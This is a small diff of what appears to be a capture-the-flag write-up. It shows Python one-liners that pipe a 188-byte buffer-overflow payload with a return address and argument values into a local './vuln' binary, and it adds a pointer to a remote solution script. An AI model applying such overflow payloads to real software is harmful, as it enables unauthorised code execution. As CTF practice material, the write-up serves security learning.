@@ -74,4 +74,4 @@ $ python -c 'import sys; sys.stdout.buffer.write(b"A"*188+b"\xe2\x91\x04\x08")' 
 $ python -c 'import sys; sys.stdout.buffer.write(b"A"*188+b"\xe2\x91\x04\x08"+b"retu"+b"\xef\xbe\xad\xde\x0d\xd0\xde\xc0")' | ./vuln
 ```
 - **This workds locally!**
-- See 
+- See you_know_diablos.py for remote solution
